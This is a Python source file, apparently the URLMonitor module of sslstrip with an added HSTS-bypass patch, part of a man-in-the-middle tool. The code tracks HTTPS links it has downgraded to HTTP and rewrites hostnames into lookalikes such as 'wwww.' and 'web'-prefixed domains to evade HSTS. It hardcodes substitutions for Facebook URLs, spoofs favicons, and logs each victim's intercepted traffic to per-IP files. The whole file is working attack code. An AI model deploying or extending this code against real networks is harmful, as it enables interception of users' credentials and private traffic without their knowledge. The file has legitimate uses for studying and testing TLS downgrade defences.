# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import re, os
import logging

class URLMonitor:    

    '''
    The URL monitor maintains a set of (client, url) tuples that correspond to requests which the
    server is expecting over SSL.  It also keeps track of secure favicon urls.
    '''

    # Start the arms race, and end up here...
    javascriptTrickery = [re.compile("http://.+\.etrade\.com/javascript/omntr/tc_targeting\.html")]
    _instance          = None
    sustitucion        = {} # LEO: diccionario host / sustitucion
    real           = {} # LEO: diccionario host / real
    patchDict      = {
            'https:\/\/fbstatic-a.akamaihd.net':'http:\/\/webfbstatic-a.akamaihd.net',
            'https:\/\/www.facebook.com':'http:\/\/social.facebook.com',
            'return"https:"':'return"http:"'
            }

    def __init__(self):
        self.strippedURLs       = set()
        self.strippedURLPorts   = {}
        self.redirects          = []
        self.faviconReplacement = False
        self.hsts               = False
        self.hsts_config        = None 

    def isSecureLink(self, client, url):
        for expression in URLMonitor.javascriptTrickery:
            if (re.match(expression, url)):
                return True

        return (client,url) in self.strippedURLs

    def writeClientLog(self, client, headers, message):
        if not os.path.exists("./logs"):
            os.makedirs("./logs")

        if (client.getClientIP() + '.log') not in os.listdir("./logs"):
            
            try:
                log_message = "#Log file for %s (%s)\n" % (client.getClientIP(), headers['user-agent'])
            except KeyError:
                log_message = "#Log file for %s\n" % client.getClientIP()

            log_file = open("./logs/" + client.getClientIP() + ".log", 'a')
            log_file.write(log_message + message + "\n")
            log_file.close()
        else:
            log_file = open("./logs/" + client.getClientIP() + ".log", 'a')
            log_file.write(message + "\n")
            log_file.close()

    def getSecurePort(self, client, url):
        if (client,url) in self.strippedURLs:
            return self.strippedURLPorts[(client,url)]
        else:
            return 443

    def addRedirection(self, from_url, to_url):
        for s in self.redirects:
            if from_url in s:
                s.add(to_url)
                return
        self.redirects.append(set([from_url,to_url]))

    def getRedirectionSet(self, url):
        for s in self.redirects:
            if url in s:
                return s
        return set([url])

    def addSecureLink(self, client, url):
        methodIndex = url.find("//") + 2
        method      = url[0:methodIndex]

        pathIndex   = url.find("/", methodIndex)
        host        = url[methodIndex:pathIndex].lower()
        path        = url[pathIndex:]

        port        = 443
        portIndex   = host.find(":")

        if (portIndex != -1):
            host = host[0:portIndex]
            port = host[portIndex+1:]
            if len(port) == 0:
                port = 443

        if self.hsts:
            #LEO: Sustituir HOST
            if not self.sustitucion.has_key(host):
                lhost = host[:4]
                if lhost=="www.":
                    self.sustitucion[host] = "w"+host
                    self.real["w"+host] = host
                else:
                    self.sustitucion[host] = "web"+host
                    self.real["web"+host] = host
                logging.debug("LEO: ssl host      (%s) tokenized (%s)" % (host,self.sustitucion[host]) )
                    
            url = 'http://' + host + path
            #logging.debug("LEO stripped URL: %s %s"%(client, url))

            self.strippedURLs.add((client, url))
            self.strippedURLPorts[(client, url)] = int(port)
            return 'http://'+self.sustitucion[host]+path

        else:
            url = method + host + path

            self.strippedURLs.add((client, url))
            self.strippedURLPorts[(client, url)] = int(port)

    def setFaviconSpoofing(self, faviconSpoofing):
        self.faviconSpoofing = faviconSpoofing

    def setHstsBypass(self, hstsconfig):
        if hstsconfig:
            self.hsts = True
            self.hsts_config = hstsconfig

            for k,v in self.hsts_config.items():
                self.sustitucion[k] = v
                self.real[v] = k

    def setClientLogging(self, clientLogging):
        self.clientLogging = clientLogging

    def isFaviconSpoofing(self):
        return self.faviconSpoofing

    def isClientLogging(self):
        return self.clientLogging

    def isHstsBypass(self):
        return self.hsts

    def isSecureFavicon(self, client, url):
        return ((self.faviconSpoofing == True) and (url.find("favicon-x-favicon-x.ico") != -1))
    
    def URLgetRealHost(self,host):
        logging.debug("Parsing host: %s"%host)
        if self.real.has_key(host):
            logging.debug("New host: %s"%self.real[host])
            return self.real[host]
        else:
            logging.debug("New host: %s"%host)
            return host

    def getInstance():
        if URLMonitor._instance == None:
            URLMonitor._instance = URLMonitor()

        return URLMonitor._instance

    getInstance = staticmethod(getInstance)
